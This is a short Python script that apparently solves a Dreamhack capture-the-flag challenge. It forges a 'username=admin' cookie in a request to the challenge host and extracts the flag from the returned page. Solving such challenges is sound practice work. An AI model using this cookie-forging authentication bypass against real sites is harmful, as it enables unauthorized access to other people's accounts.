import requests
from bs4 import BeautifulSoup
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345
res = requests.get(f"{HOST}:{PORT}/", cookies={"username": "admin"})
bs4 = BeautifulSoup(res.text, "html.parser")
flag = re.search(r"(DH\{.*\})", bs4.find("h3").get_text())

print(flag.group(1))
